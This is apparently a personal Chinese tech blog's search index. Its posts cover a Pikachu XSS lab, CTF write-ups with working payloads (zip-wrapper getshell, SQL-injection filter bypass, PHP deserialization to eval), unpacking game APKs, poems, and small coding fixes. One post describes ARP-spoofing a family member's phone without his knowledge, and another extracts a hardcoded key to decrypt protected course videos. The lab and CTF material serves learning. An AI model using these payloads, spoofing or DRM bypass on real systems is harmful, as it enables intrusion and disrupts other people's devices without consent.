Eureka!","link":"/2019/09/11/Ubuntu-gemu-xv6%E6%90%AD%E5%BB%BA%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0/"},{"title":"pikachu靶场系列——XSS","text":"https://www.cnblogs.com/dogecheng/p/11556221.html 概述什么的自己看吧 反射型XSS（get）随便输入并提交后可以发现，是使用get方法提交的参数，所以可以直接插入JS代码： &lt;script&gt;alert('xss')&lt;/script&gt; 此处前端会有输入长度限制，在F12控制台中取消即可。 并且此时可以在源代码中看到插入的JS代码被直接嵌到标签中。 反射型XSS（post）打开burpsuite，在网页中输入username和password后提交，可以看到post的具体信息 登录成功后可以像上一个get一样操作，并且这个没有最大长度限制。 （但是实际应用中需要自己搭一个恶意站点，详细参考开头的文章） （搭站点这个技能树还没点亮） 存储型XSS存储型XSS的特点就是恶意代码会被存放在网站后台，每当有用户访问到该处时便会触发。 插入代码和上面相同。 DOM型XSS查看网页源代码： 可以看到官方是给了提示的。 通过字符串拼接构造闭合payload ' onclick=&quot;alert('xss')&quot;&gt; XSS之过滤由于过滤存在多种可能性，所以需要经验和尝试 通过测试可发现过滤了“&lt;script”字符，因此尝试改用大写payload &lt;SCRIPT&gt;alert('xss')&lt;/SCRIPT&gt; 通常情况下还有其他绕过策略，如： 双写（拼凑），&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;。后台可能把标签去掉换，但可能只去掉一次。 注释干扰，&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;。加上注释后可能可以绕过后台过滤机制。 （To be continued）","link":"/2020/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94XSS/"},{"title":"“第五空间”网络安全大赛","text":"一更 2019.8.23二更 2019.9.1 一、前言本次比赛没有腥风血雨，没有酣畅淋漓，从早到晚，只做出来一道题，还是签到题，还是在将近中午的时候看了主办方发在平台上极不显眼的公告。。。。。。 （中年大叔自闭中） 二、题解还是具体讲一下部分题的解法吧，本人水平不胜菜鸡，实感惭愧 1.空性 查看源码，发现用户名和密码是本地JS校验，查看JS源码得知用户名是Youguess，密码随意 还可以直接跳转到http://111.33.164.4:10003/151912db206ee052.php 之后就没有思路了，，，， (更新) 存在文件泄露http://111.33.164.4:10003/.151912db206ee052.php.swp 1234567891011121314151617184 error_reporting(0);5 class First{6 function firstlevel(){7 $a='whoami';8 extract($_GET);9 $fname = $_GET['fname']?$_GET['fname']:'./js/ctf.js';10 $content=trim(file_get_contents($fname));11 if($a==$content)12 {13 echo 'ok';;14 else15 {16 echo '听说你的Linux用的很6？';17 }18 }19 }20 $execfirst = new First();21 $execfirst -&gt; firstlevel(); 存在变量覆盖，之后显示一个新的地址 2d019a311aaa30427.php?refer=df53ca268240ca76670c8566ee54568a&amp;t=20190828&amp;dtype=computer&amp;file=3792689baaabc7eb&amp;hash256=9c062d7697674fb92d0a03c2bf3b6ad6 上传zip，然后利用zip伪协议包含getshell。 123456789101112POST /2d019a311aaa30427.php?refer=df53ca268240ca76670c8566ee54568a&amp;t=20190828&amp;dtype=computer&amp;file=?&amp;file=zip://upload/6e5555b6856e20.zip%231&amp;hash256=25db8caabd7e5c2b6976fa657112c4b7 HTTP/1.1Host: 111.33.164.4:10003Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 530=cat flagishere/c5a3038d0aeb393711c53abe41dd15f2.php 2.空相题目提示有个参数叫id，遂尝试/?id=1, /?id=2, /?id=1 and 2 （这是id=1 and 2） （这是id=2） 告诉了我们一个新的文件 ./25d99be830ad95b02f6f82235c8edcf7.php，访问得到一串乱码 看来和token有关，公告说token是登录时下发的，那就截取登录响应包获得token（官方告诉在浏览器里找，不过我没找到） 获取token后输入……/25d99be830ad95b02f6f82235c8edcf7.php/?token=……就能得到flag 3.五叶开局一个login界面，尝试普通的sql注入，发现= ‘ and or等均被过滤，遂卡住，，，学长提示： user=admin&amp;password=1’||IF(username regexp’^admin$’,1,0)||sleep(0.5))#–+a&amp;login=Login 成功登录 继续访问该php，发现还是需要token，在url后添加/?token=xxxx后可得flag 该题重点难点在于如何绕过比较严格的非法字符检测，具体原理有待分析 以下补充内容来自学长的wp: 4.六尘这个网站curl能ssrf，但是没啥用，通过其他题目得知通过存在一个flagishere获取利用token取得的flag。访问http://111.33.164.4:10005/flagishere/后发现存在目录遍历，于是直接提交token获取flag。 http://111.33.164.4:10005/flagishere/6be8b547d6db1d213c1ceecc30b3cb24.php?token=1DJAVU22DOAFE800000020PIO5JH0MHN 5.八苦http://111.33.164.4:10004/index.phps 存在代码泄露 12345678910111213141516171819202122232425262728error_reporting(0);class Test{ protected $careful=1; public $securuty; public function __wakeup(){ if($this-&gt;careful===1){ phpinfo(); // step 1: read source,get phpinfo and read it carefullt } } public function __get($name){ return $this-&gt;securuty[$name]; } public function __call($param1,$param2){ var_dump(11); if($this-&gt;{$param1}){ eval('$a='.$_GET['dangerous'].';'); } }}class User{ public $user; public function __wakeup(){ $this-&gt;user=new Welcome(); $this-&gt;user-&gt;say_hello(); }}// $string=$_GET['foo']??$a;// unserialize($string); 发现没法利用，但可以反序列化执行phpinfo。 1http://111.33.164.4:10004/index.php?foo=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A1%3Bs%3A8%3A%22securuty%22%3BN%3B%7D 发现有preload配置，加载此文件http://111.33.164.4:10004/this_is_a_preload.php 1234567891011121314151617181920&lt;?php class Welcome{ public function say_hello(){ echo &quot;welcome&lt;br&gt;&quot;; } } class Welcome_again{ public $willing; public $action; public function __construct(){ $this-&gt;action=new Welcome; } public function __destruct(){ if($this-&gt;willing){ $this-&gt;action-&gt;say_hello(); } } } highlight_file(__FILE__)?&gt; 然后就可以通过Welcome_again进行call调用，通过eval执行代码。 1234http://111.33.164.4:10004/index.php?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A3%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3BN%3Bs%3A9%3A%22say_hello%22%3Bs%3A4%3A%22null%22%3B%7D%7D&amp;dangerous=phpinfo(); 三、总结这次比赛总的来说或许难度较大，但是成功暴露了我的知识的欠缺，尤其是在某个方面深入程度严重不足，pwn更是致命的弱点，全程一道pwn都没有做出来过，实在是惭愧。但我觉得如果开荒时期能有高人指点，或许能少走一些弯路，提高一些效率。 吐槽一波南开的服务器平台，点一下卡一年，装备不花一分钱","link":"/2019/08/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"},{"title":"安卓手游解包笔记","text":"使用unity制作的安卓手游解包注：本文仅限技术讨论，请勿进行任何侵犯他人知识产权的行为。 示例包名：com.hypergryph.arknights 解包游戏apk由于apk是一种压缩文件格式，可以使用任何解压缩软件进行解包。 通过查阅资料可知，各个文件（夹）的作用如下： 文件（夹）名称 内容 assets unity游戏所需资源文件 lib arm和x86所需要的.so文件 META-INF 信息包 res 存放图标等资源文件 AndroidManifest.xml Android清单文件 classes.dex Android Dalvik可执行文件 resources.arsc 编译后的二进制资源文件 由于是要关注立绘、语音等资源，所以需要重点浏览assets目录。 如果对游戏机制和具体实现感兴趣，可以反编译classes.dex文件，那就是另外一个故事了。 查看资源文件使用工具：UnityStudio（下载地址放在文末） 经努力查找，游戏中使用的美术资源、语音资源都放在assets/AB/Android中，推测AB为AssetBundle的缩写。 以下列出各文件的具体位置： 资源类别 位置 人物语音 /audio/sound_beta_2/voice 攻击、技能音效 /audio/sound_beta_2/player 游戏BGM /audio/sound_beta_2/music 立绘、游戏背景 /avg 其他美术资源 /arts 主线剧情文本 /gamedata/story/obt.ab 活动剧情文本 /gamedata/story/activities.ab 游戏内其他文本及提示 /i18n/string_map.ab 每章标题图片 /spritepace 历次寻访图片（存在bug） /ui/gacha 每章内部关卡背景图 /ui/stage.ab 来发个刀子 白兔子不要走！ 最后希望yj快出第七章吧 参考资料：https://blog.csdn.net/u011611902/article/details/104154072 UnityStudio： ​ 源码：https://github.com/Perfare/AssetStudio ​ latest release：https://ci.appveyor.com/project/Perfare/assetstudio/branch/master/artifacts","link":"/2020/02/09/%E4%BD%BF%E7%94%A8unity%E5%88%B6%E4%BD%9C%E7%9A%84%E5%AE%89%E5%8D%93%E6%89%8B%E6%B8%B8%E8%A7%A3%E5%8C%85/"},{"title":"加密M3U8下载解密流程分析","text":"记录一下获取某在线课堂网站的视频课程资源（M3U8）全过程。 参考资料：某网址视频下载解密流程分析及脚本实现 – 作者:6FyY2p-安全小百科 一、背景介绍公司要求所有新员工进行在线课程学习，并配有在线考试。为达到更好的查资料学习效果，打算把视频课程下载到本地浏览； 已知非大型视频类网站的视频资源往往较容易获取，常见资源嗅探方式有： IDM浏览器扩展自带嗅探浮窗； 安装CocoCut等资源嗅探扩展，获取视频链接，再导入其他软件下载； 使用视频网站自带的下载功能； 其中IDM在非加密资源的下载体验是最好的（毕竟是下载器起家），但遇到带价密的M3U8文件则提示由于版权原因不支持下载，因此对于加密M3U8常用的下载软件有： nilaoda大佬的N_m3u8DL-CLI：https://github.com/nilaoda/N_m3u8DL-CLI ps：作者表示由于该项目耦合过多，难以扩展，因此项目已进入维护阶段，后续新的跨平台下载器的开发转至另一仓库： https://github.com/nilaoda/N_m3u8DL-RE 二、实际操作1. 分析视频格式根据 CocoCut 的嗅探结果，该视频为 m3u8 格式，由结尾的_enc猜测带有加密； 2. 尝试常规方法下载使用 N_m3u8DL_CLI 下载，下载窗口直接闪退，工作目录只留下raw.m3u8文件： 文件中的METHOD=AES-128、IV=***、KEYFORMAT=media-drm-token确定视频使用了 AES-128-CBC 加密 3. 寻找其他下载方式1. 寻找 BaseUrl BaseUrl 指 M3U8 流媒体各个视频分片（扩展名.ts）的前缀 URL，后续的下载需要使用 BaseUrl+URI 进行拼接（有的不需要）； 在浏览器使用F12打开开发者工具，切换到“网络”选项卡，刷新页面并加载一小段，搜索ts： 可以发现视频分片的Get请求地址和M3U8文件里的URI并不同，查看多个ts文件的请求地址前缀均为此，所以提取文件名之前的部分作为BaseUrl； 2. 构造请求Headers从以上截图中还可以发现该视频网站的引用站点策略（Referrer Policy）设置为strict-origin-when-cross-origin用于防盗链，查看多个ts文件的请求Headers，在构造请求时添加额外值： 以N_m3u8DL_CLI为例，添加命令行参数：--headers &quot;:authority:***|origin:***|referer:***&quot; 3. 寻找视频解密Key该部分为重点内容 根据以往的经验，加密M3U8文件一般在头部会注明获取key的URL，但从截图中发现此M3U8文件并未标注，因此在浏览器开发者工具中搜索videokey，果然发现一条记录： 此时如果直接使用该密钥进行解密，会提示失败，且解密后的文件仍然无法播放。查看该值对应的键名“encryptedVideoKey”即加密后的视频密钥，推测视频的真实密钥也被做了加密。 经过搜索，查找到相关博客（如开头所述），根据文中指示进行后续操作 在开发者工具-源代码标签页内右键顶级目录，选择“在所有文件中搜索”，查找encryptedVideoKey字样，得到以下结果： 此时不确定具体是哪个js脚本负责此页面的视频播放逻辑，因此全部代码格式化后在相应位置下断点： 123456789101112if (&quot;media-drm-token&quot; === e.playlist.keyFormat || &quot;media-drm-player-binding&quot; === e.playlist.keyFormat) { for (var o = JSON.parse(r), f = o.encryptedVideoKey, c = u[&quot;default&quot;].utils.utf8.toBytes(&quot;72Fhskjglp8qjpqx&quot;), h = new u[&quot;default&quot;].ModeOfOperation.ecb(c), p = [], m = 0; m &lt; f.length; m += 2) p.push(parseInt(f[m] + f[m + 1], 16)); var y = h.decrypt(p) , _ = u[&quot;default&quot;].utils.utf8.fromBytes(y) , v = function(e) { for (var t = new ArrayBuffer(e.length), i = new Uint8Array(t), n = 0, r = e.length; n &lt; r; n++) i[n] = e.charCodeAt(n); return t }(_); l = s = new DataView(v)} 这段代码大致逻辑为： 密钥c：硬编码字符串72Fhskjglp8qjpqx； 解密器h：AES-ECB模式； f：加密后的视频密钥； 循环将 f 赋值到 p 中，解密器 h 使用 c 解密 p，解密结果为参数 y，即 y 为真正的视频密钥。 因此下断点后刷新页面，y 执行结束后在控制台输出该值： 从代码输出中可以证明，p 确实为加密后的密钥，而 y 则为解密后的视频密钥。 使用010Editor创建解密文档dec.key并写入密钥： 下载前的准备工作基本完成。 4. 下载视频根据 N_m3u8DL_CLI 的文档，使用如下参数： 1.\\N_m3u8DL-CLI_v3.0.2.exe &quot;https://***/f3cb79e1ac654fccae295a612b00be2e_1030324010_480p_enc.m3u8&quot; --workDir &quot;C:\\Users\\***\\Downloads&quot; --baseUrl &quot;https://***/&quot; --headers &quot;:authority:***|origin:***|referer:***/&quot; --useKeyFile &quot;C:\\Users\\***\\Desktop\\dec.key&quot; --useKeyIV &quot;a3c41e5794ee05de82bf48e4654584e2&quot; 运行后视频下载完成，并成功解密，可供本地观看。","link":"/2022/09/14/%E5%8A%A0%E5%AF%86M3U8%E4%B8%8B%E8%BD%BD%E8%A7%A3%E5%AF%86%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"},{"title":"关于hexo一个bug的发现","text":"昨天我写了一篇《解决CSharp在高分辨率缩放下字体模糊》的文章，今天打开时发现网站提示404，于是各种研究原因。 首先怀疑和最近git bash、Android Studio莫名乱码有关，但后来发现并不是。 然后怀疑是文件名、标题、tag中含有特殊字符#的关系，于是逐一排查。 最后发现，在文章标题（.md文件中）、tag（.md文件中）均含有#字符时，网页不会404，唯独在.md文件的文件名中出现则会崩溃，因为网页默认按照文件名创建同名目录，可能是在解析url时#产生了影响。 所以，换掉文件名中的#就好了。","link":"/2020/09/10/%E5%85%B3%E4%BA%8Ehexo%E4%B8%80%E4%B8%AAbug%E7%9A%84%E5%8F%91%E7%8E%B0/"},{"title":"十九","text":"作于2019年12月9日凌晨01:10 昨夜雨疏风骤。雾霭裹挟着至臻的思念，徐徐地，翻越山海。岁岁今朝，青春几许，可待年少。所幸邂逅，余生漫长，祈愿相依相守。既不合君，惟盼幸福，萦绕不绝。晨暮不歇，祈君安好，春归冬回，情深如初。倘若此后难遇伊人，你镌刻在我生命中的美好，足以令我，终日为你祝福，愿祝福横亘千里，绵延九州，愿青鸟遥寄思绪，簸却沧溟。","link":"/2019/12/09/%E5%8D%81%E4%B9%9D/"},{"title":"南风知我意，吹梦到西洲","text":"来源：网易云音乐作曲 : 铃木航海 作词 : 颀鞍 编曲：远藤直弥/冯帆 （妖扬） 无何化有 感物知春秋 秋毫濡沫欲绸缪 搦管相留 （黄诗扶） 留骨攒峰 留容映水秀 留观四时曾邂逅 佳人西洲 （妖扬） 西洲何有 远树平高丘 云闲方外雨不收 稚子牵牛 （黄诗扶） 闹市无声 百态阴晴栩栩侔 藤衣半卷苔衣皱 岁月自无忧 （妖扬） 驾马驱车 尚几程扶摇入画中 咫尺 （黄诗扶） 径曲桥横 精诚难通 盼你渡口 待你桥头 （黄诗扶、妖扬） 松香接地走 挥癯龙绣虎出怀袖 起微石落海连波动 描数曲箜篌线同轴 勒笔烟直大漠 沧浪盘虬 一纸淋漓漫点方圆透 记我 长风万里绕指未相勾 形生意成 此意 逍遥不游 （妖扬） 日月何寿 江海滴更漏 爱向人间借朝暮 悲喜为酬 （黄诗扶） 种柳春莺 知它风尘不可救 绵绵更在三生后 谁隔世读关鸠 （妖扬） 诗说红豆 遍南国未见人长久 见多少 （黄诗扶） 来时芳华 去时白头 忘你不舍 寻你不休 （黄诗扶、妖扬） 画外人易朽 似浓淡相间色相构 染冰雪先披琉璃胄 蘸朱紫将登金银楼 天命碧城灰土 刀弓褐锈 举手夜古泼断青蓝右 照我 萤灯嫁昼只影归洪流 身魂如寄 此世 逍遥不游 （黄诗扶） 情一物 无木成林无水行舟 情一事 未算藏谋真还谬 情一人 积深不厚积年不旧 情一念 墨尽非空 百代飞白骤 划地为囚 （妖扬） 蓝田需汲酒 惟琼浆能浇美玉瘦 至高者清难垢 至贵者润因愁 痴竭火 知她不能求 醉逢歌 知他不必候 只约灵犀过隙灵光暗相投 （黄诗扶、妖扬） 万籁停吹奏 支颐听秋水问蜉蝣 既玄冥不可量北斗 却何信相思最温柔 顾盼花发鸿蒙 怦然而梦 你与二十八宿皆回眸 系我 彩翼鲸尾红丝天地周 情之所至 此心 逍遥不游 https://music.163.com/song?id=1376873330&amp;userid=1554213928","link":"/2019/09/01/%E5%8D%97%E9%A3%8E%E7%9F%A5%E6%88%91%E6%84%8F%EF%BC%8C%E5%90%B9%E6%A2%A6%E5%88%B0%E8%A5%BF%E6%B4%B2/"},{"title":"博客初体验","text":"1.一点心得&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;折腾了一个中午加上一个下午，终于开通了自己的个人博客，心累~&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;有时间再更新一下搭建过程吧。 2.更新时间&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;看心情吧，本人实在是懒得维护学业繁忙，望见谅~ 3.内容相关&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;emmm大概是技术分析为主吧，偶尔可能更新些情感方面的？（害羞~）","link":"/2019/08/25/%E5%8D%9A%E5%AE%A2%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"title":"BAN掉那个APP(一)——Kali篇","text":"Kali的正确使用——父慈子孝前情提要：回家一个月，不巧赶上疫情爆发，只好在家久宅。家父鉴于生活习惯，勤于节俭，锱铢之事必较于细。曾几何时陷入“趣*条”挣钱无法自拔，殊不知自已委身广告商，每日辛苦所得不过一二元余，令人甚是叹惋。 一、ettercap搭配arpspoof打开kali linux，虚拟机网络模式选择桥接模式，以确保kali与目标主机在同一网段。使用带有图形界面的ettercap， 在菜单栏选择Sniff-Unified sniffing-OK开始嗅探； 在菜单栏选择Hosts-Scan for hosts扫描局域网所有主机，此处可能扫描不到，建议多尝试几次。 使用某种手段确定家父的手机IP为192.168.1.101。 在命令行中键入arpspoof -i eth0 -t 192.168.1.105 192.168.1.1开启转发，此时来自目标主机的流量都会被转发至网关（大概），从而使其得不到真正的DNS解析。 在家父不断抱怨为什么网络质量这么差的时候忍住不笑。 二、咱不是有后台嘛打开安卓模拟器，安装HTTP Canary、抓包精灵和某受害者app，开始抓包。 可知该app访问的URL主要有： http://api.1sapp.com/ http://apk.1sapp.com/ http://api.weibo.com/ http://mediaconfig.qutoutiao.net/ http://rcv.aiclk.com/ 2020-2-24新增： https://message-push.1sapp.com/ https://html2.qktoutiao.com/ http://cdn-qukan.1sapp.com/ https://ddd.1sapp.com/ 以及云服务提供商：腾讯云 119.29.29.29 浏览器键入192.168.1.1进入路由器后台管理界面 点击管理按钮，添加禁止访问记录 将以上URL添加到黑名单中。 注：按以上内容操作，不排除被发现的可能，以及不提供如何面对父慈子孝的经典场面的教程。","link":"/2020/02/01/%E5%B1%80%E5%9F%9F%E7%BD%91kali%E5%AE%9E%E9%AA%8C/"},{"title":"曾盼故梦，山河依旧","text":"（这一切与我又有什么关系呢） 借以怀念那位少女，惟愿她今后幸遇佳人，相伴珍重，则我无憾矣。 2019.8.17此去经年， 何惧？ 渐行渐远渐无书。 2019.7.2若可知山海不可平， 又怎怨艾今夕何夕。 此去无多路， 山一程，水一程。 此生真意， 化作渤海湾的守望。 2019.5.20这少女竟皱了桃腮粉面 我祈祷有幸共繁华唱遍","link":"/2019/09/01/%E6%9B%BE%E7%9B%BC%E6%95%85%E6%A2%A6%EF%BC%8C%E5%B1%B1%E6%B2%B3%E4%BE%9D%E6%97%A7/"},{"title":"解决c#在高分辨率缩放下字体模糊","text":"众所周知在Windows笔记本上大多启用文本缩放125%，150%等，导致很多应用字体模糊。 一、现象描述在上一次写过网易云音乐缓存转换器后，我发现生成的.exe文件字体十分模糊，字体边缘不够锐利： 二、解决方案在参考了许多资料后，找到了有效方案，微软已经在C#（Winform）开发中内置了对于高分辨率的适配 在解决方案资源管理器中右键项目名称，点击添加-类 选择应用程序清单文件 打开清单文件，找到以下代码，并将除中文注释外的部分解除注释。 12345678910&lt;!-- 指示该应用程序可以感知 DPI 且 Windows 在 DPI 较高时将不会对其进行 自动缩放。Windows Presentation Foundation (WPF)应用程序自动感知 DPI，无需 选择加入。选择加入此设置的 Windows 窗体应用程序(目标设定为 .NET Framework 4.6 )还应 在其 app.config 中将 &quot;EnableWindowsFormsHighDpiAutoResizing&quot; 设置设置为 &quot;true&quot;。--&gt; &lt;application xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt; &lt;windowsSettings&gt; &lt;dpiAware xmlns=&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;&gt;true&lt;/dpiAware&gt; &lt;/windowsSettings&gt; &lt;/application&gt; 使用此配置生成的Winform程序就不会有字体模糊问题了。 三、效果展示","link":"/2020/09/09/%E8%A7%A3%E5%86%B3CSharp%E5%9C%A8%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E7%BC%A9%E6%94%BE%E4%B8%8B%E5%AD%97%E4%BD%93%E6%A8%A1%E7%B3%8A/"},{"title":"献礼祖国70周年","text":"戮力同心即中国从银装素裹，万里雪飘的北疆，到烟花三月，春风十里的南国，脚步丈量着你每一寸身躯，鼻息氤氲着你每一缕芬芳。目之所及，是绵延万里，横亘南北的锦绣江山，耳之所闻，乃平仄有韵，抑扬顿挫的文辞歌赋。挥毫描摹中，尽显你巍峨矗立的身姿，春秋笔法间，勾勒你坚毅刚劲的眼神。 七十年前，伟人宣告，雄狮初醒；七十年后，普天同庆，朝日初升。昨日屈辱，往昔悲歌，凄凄肝肠寸断；今朝伟绩，明日蓝图，悠悠壮阔波澜。你曾用累累的伤痕，蹒跚的脚步，疮痍的土地，声声控诉暴徒的野蛮；你曾化绽红的鲜血，挥洒的汗水，愤怒的咆哮，炽烈书写炎黄的不屈；敬爱的先辈们，这盛世如您所愿：今日中国之所在，雄踞东亚，傲视欧美，光芒万丈，来日方长；她播撒下东方魔稻，让世界千万百姓告别饥荒；她寻找到葳蕤青蒿，让非洲肆虐瘟疫烟消云散；她支撑着高铁路网，向世界七洲展耀中国速度；她拔地起雄伟桥梁，使深山险壑村村交通保障；神女应无恙，当惊世界殊。 曾有先驱，引星星之火，终成燎原之势；而今吾辈，继前辈余烈，奔赴宇内六合。国之器重，如贯长虹，剑锋所指，心之所向。天地立心，生民立命，继往绝学，开世太平。北洋学子，赤子莘莘，英华卓荦，努力追踪。 今共祝祖国：苍劲挺拔，与天不老，果敢勇毅，万寿无疆；愿你时常春阳笼覆，暖意深沁心脾，愿你久违夏雨润泽，清甜荡涤肌肤，愿你邂逅秋实累硕，饱满充盈肢体，愿你祈待冬雪娴雅，谧静萦绕身旁。 ps: 特别鸣谢制作封面海报的王吉吉同学~","link":"/2019/10/01/%E7%8C%AE%E7%A4%BC%E7%A5%96%E5%9B%BD70%E5%91%A8%E5%B9%B4/"},{"title":"网易云音乐PC缓存转换mp3","text":"1. 网易云音乐PC版缓存位置及编码方式缓存文件位置：C:\\Users\\当前用户名\\AppData\\Local\\Netease\\CloudMusic\\Cache\\Cache\\ 缓存文件格式：*.uc 参考资料可知，缓存文件与原始mp3文件的大小相同，且缓存文件中大量存在字符“A3”，故推测缓存文件的编码方式为将原始mp3与0xa3异或得到。 2. 使用代码实现文件转换java版123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104public class UI { private JFrame frame = new JFrame(&quot;转换器&quot;); private JPanel panel = new JPanel(); private JLabel label1 = new JLabel(&quot;输入路径：&quot;); private JLabel label2 = new JLabel(&quot;输出路径：&quot;); private JLabel state = new JLabel(); private JTextField inputPath = new JTextField(); private JTextField outputPath = new JTextField(); private JButton convert = new JButton(&quot;转换&quot;); private JButton cancel = new JButton(&quot;取消&quot;); private JButton chooseInputPath = new JButton(&quot;...&quot;); private JButton chooseOutputPath = new JButton(&quot;...&quot;); public UI(){ frame.setSize(500, 200); frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); frame.setLocationRelativeTo(null); label1.setBounds(10, 10, 80, 25); label2.setBounds(10, 40, 80, 25); inputPath.setBounds(90, 10, 350, 25); outputPath.setBounds(90, 40, 350, 25); chooseInputPath.setBounds(450, 10, 30, 25); chooseOutputPath.setBounds(450, 40, 30, 25); state.setBounds(10, 70, 200, 30); state.setFont(new Font(&quot;微软雅黑&quot;, Font.PLAIN, 13)); state.setForeground(Color.PINK); convert.setBounds(10, 110, 100, 25); cancel.setBounds(300, 110, 100, 25); chooseInputPath.addActionListener(new ActionListener() { @Override public void actionPerformed(ActionEvent e) { JFileChooser fileChooser = new JFileChooser(); fileChooser.setCurrentDirectory(new File(&quot;.&quot;)); fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY); fileChooser.setFileFilter(new FileNameExtensionFilter(&quot;*.uc&quot;, &quot;uc&quot;)); int result = fileChooser.showOpenDialog(frame); if(result == JFileChooser.APPROVE_OPTION){ File file = fileChooser.getSelectedFile(); String str = file.getAbsolutePath(); inputPath.setText(str); str = str.substring(0, str.length()-3); outputPath.setText(str + &quot;.mp4&quot;); } } }); cancel.addActionListener(new ActionListener() { @Override public void actionPerformed(ActionEvent e) { System.exit(0); } }); convert.addActionListener(new ActionListener() { @Override public void actionPerformed(ActionEvent e) { state.setText(&quot;正在转换，请稍后......&quot;); ucConvert(inputPath.getText(), outputPath.getText()); state.setText(&quot;转换完成！&quot;); } }); panel.setLayout(null); panel.add(label1); panel.add(label2); panel.add(inputPath); panel.add(outputPath); panel.add(chooseInputPath); panel.add(chooseOutputPath); panel.add(convert); panel.add(cancel); panel.add(state); frame.add(panel); frame.setVisible(true); } public void ucConvert(String inputPath, String outputPath){ try{ File inFile = new File(inputPath); File outFile = new File(outputPath); DataInputStream dis = new DataInputStream( new FileInputStream(inFile)); DataOutputStream dos = new DataOutputStream( new FileOutputStream(outFile)); byte[] by = new byte[1000]; int len; while((len=dis.read(by))!=-1){ System.out.println(len); for(int i=0;i&lt;len;i++){ by[i]^=0xa3; } dos.write(by,0,len); } dis.close(); dos.close(); }catch(IOException ioe){ System.err.println(ioe); } } public static void main(String[] args){ new UI(); }} 由于带有GUI界面，代码较长，核心代码仅为ucConvert()函数部分。（转载） C#版Form1.Designer.cs123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204namespace CloudMusicDecode{ partial class Form1 { /// &lt;summary&gt; /// 必需的设计器变量。 /// &lt;/summary&gt; private System.ComponentModel.IContainer components = null; /// &lt;summary&gt; /// 清理所有正在使用的资源。 /// &lt;/summary&gt; /// &lt;param name=&quot;disposing&quot;&gt;如果应释放托管资源，为 true；否则为 false。&lt;/param&gt; protected override void Dispose(bool disposing) { if (disposing &amp;&amp; (components != null)) { components.Dispose(); } base.Dispose(disposing); } #region Windows 窗体设计器生成的代码 /// &lt;summary&gt; /// 设计器支持所需的方法 - 不要修改 /// 使用代码编辑器修改此方法的内容。 /// &lt;/summary&gt; private void InitializeComponent() { this.groupBox1 = new System.Windows.Forms.GroupBox(); this.chooseInputPath = new System.Windows.Forms.Button(); this.inputPath = new System.Windows.Forms.TextBox(); this.inputPathLabel = new System.Windows.Forms.Label(); this.groupBox2 = new System.Windows.Forms.GroupBox(); this.chooseOutPath = new System.Windows.Forms.Button(); this.checkBox1 = new System.Windows.Forms.CheckBox(); this.outPath = new System.Windows.Forms.TextBox(); this.outPathLabel = new System.Windows.Forms.Label(); this.startButton = new System.Windows.Forms.Button(); this.closeButton = new System.Windows.Forms.Button(); this.progressBar1 = new System.Windows.Forms.ProgressBar(); this.groupBox1.SuspendLayout(); this.groupBox2.SuspendLayout(); this.SuspendLayout(); // // groupBox1 // this.groupBox1.Controls.Add(this.chooseInputPath); this.groupBox1.Controls.Add(this.inputPath); this.groupBox1.Controls.Add(this.inputPathLabel); this.groupBox1.Font = new System.Drawing.Font(&quot;微软雅黑&quot;, 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134))); this.groupBox1.Location = new System.Drawing.Point(12, 12); this.groupBox1.Name = &quot;groupBox1&quot;; this.groupBox1.Size = new System.Drawing.Size(758, 100); this.groupBox1.TabIndex = 0; this.groupBox1.TabStop = false; this.groupBox1.Text = &quot;输入&quot;; // // chooseInputPath // this.chooseInputPath.Location = new System.Drawing.Point(709, 41); this.chooseInputPath.Name = &quot;chooseInputPath&quot;; this.chooseInputPath.Size = new System.Drawing.Size(30, 27); this.chooseInputPath.TabIndex = 2; this.chooseInputPath.Text = &quot;...&quot;; this.chooseInputPath.UseVisualStyleBackColor = true; this.chooseInputPath.Click += new System.EventHandler(this.chooseInputPath_Click); // // inputPath // this.inputPath.Location = new System.Drawing.Point(82, 41); this.inputPath.Name = &quot;inputPath&quot;; this.inputPath.Size = new System.Drawing.Size(620, 27); this.inputPath.TabIndex = 1; // // inputPathLabel // this.inputPathLabel.AutoSize = true; this.inputPathLabel.Location = new System.Drawing.Point(6, 47); this.inputPathLabel.Name = &quot;inputPathLabel&quot;; this.inputPathLabel.Size = new 